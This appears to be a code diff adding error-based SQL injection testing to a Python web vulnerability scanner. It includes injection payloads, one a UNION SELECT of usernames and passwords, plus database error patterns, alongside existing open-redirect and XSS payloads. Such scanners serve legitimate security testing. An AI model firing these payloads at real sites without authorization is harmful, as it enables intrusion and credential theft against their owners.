@@ -32,6 +32,31 @@ class PayloadTester:
         'data:text/html,<script>alert(1)</script>',
         '/\\evil.com',
     ]
+
+    # Basic SQL injection payloads (non-destructive)
+    SQLI_PAYLOADS = [
+        "' OR '1'='1",
+        "\" OR \"1\"=\"1",
+        "' OR 1=1 --",
+        "1' OR '1'='1",
+        "1' OR 1=1 --",
+        "' UNION SELECT NULL--",
+        "' UNION SELECT username, password FROM users--",
+    ]
+
+    # Common database error message fragments to look for
+    SQL_ERROR_PATTERNS = [
+        "you have an error in your sql syntax",
+        "warning: mysql",
+        "unclosed quotation mark after the character string",
+        "quoted string not properly terminated",
+        "pg_query():",
+        "sqlstate[",
+        "ora-01756",
+        "odbc sql server driver",
+        "mysql_fetch_array()",
+        "native client",
+    ]
     
     def __init__(self, request_handler: RequestHandler):
         self.request_handler = request_handler
@@ -175,6 +200,68 @@ class PayloadTester:
                                 results['severity'] = 'medium'
                             break  # Found redirect in this parameter
         
+        return results
+
+    def test_sqli(self, url: str) -> Dict:
+        """Test for basic SQL injection vulnerability by error-based detection."""
+        results = {
+            'url': url,
+            'vulnerable_parameters': [],
+            'vulnerabilities': [],
+            'severity': 'low'
+        }
+
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+
+        if not params:
+            # If no parameters, try common parameter names
+            params = {
+                'id': ['1'],
+                'user': ['1'],
+                'uid': ['1'],
+                'product': ['1'],
+            }
+
+        for param_name in params.keys():
+            for payload in self.SQLI_PAYLOADS:
+                test_params = params.copy()
+                test_params[param_name] = [payload]
+
+                new_query = urlencode(test_params, doseq=True)
+                test_url = urlunparse((
+                    parsed.scheme,
+                    parsed.netloc,
+                    parsed.path,
+                    parsed.params,
+                    new_query,
+                    parsed.fragment
+                ))
+
+                response = self.request_handler.get(test_url)
+                if not response or not response.text:
+                    continue
+
+                text_lower = response.text.lower()
+                if any(err in text_lower for err in self.SQL_ERROR_PATTERNS):
+                    if param_name not in [v['parameter'] for v in results['vulnerable_parameters']]:
+                        results['vulnerable_parameters'].append({
+                            'parameter': param_name,
+                            'payload': payload,
+                            'url': test_url,
+                        })
+
+                        results['vulnerabilities'].append({
+                            'type': 'SQL Injection (error-based)',
+                            'parameter': param_name,
+                            'payload': payload,
+                            'url': test_url,
+                            'description': f'Potential SQL injection vulnerability in parameter: {param_name} (error message detected)',
+                            'severity': 'high',
+                        })
+                        results['severity'] = 'high'
+                        break  # move to next parameter
+
         return results
     
     def _check_reflection(self, payload: str, response_text: str) -> bool:
